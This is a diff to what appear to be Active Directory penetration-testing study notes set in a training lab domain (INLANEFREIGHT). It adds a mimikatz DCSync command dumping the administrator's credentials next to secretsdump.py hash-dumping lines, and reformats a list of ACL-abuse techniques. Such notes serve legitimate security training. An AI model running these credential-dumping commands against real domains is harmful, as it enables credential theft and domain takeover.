@@ -37,11 +37,15 @@ To perform this attack, you must have control over an account that has the right
     secretsdump.py -outputfile <file_to_save_hashes> -just-dc <domain_name>/<username_with_permissions>@<dc_ip>
     secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
 
+    or with mimikatz
 
-    WriteOwner abused with Set-DomainObjectOwner
-    WriteDACL abused with Add-DomainObjectACL
-    AllExtendedRights abused with Set-DomainUserPassword or Add-DomainGroupMember
-    Add Members abused with Add-DomainGroupMember
+    lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+
+
+WriteOwner abused with Set-DomainObjectOwner
+WriteDACL abused with Add-DomainObjectACL
+AllExtendedRights abused with Set-DomainUserPassword or Add-DomainGroupMember
+Add Members abused with Add-DomainGroupMember
 
 
 ## LLMNR/NBT-NS Poisoning
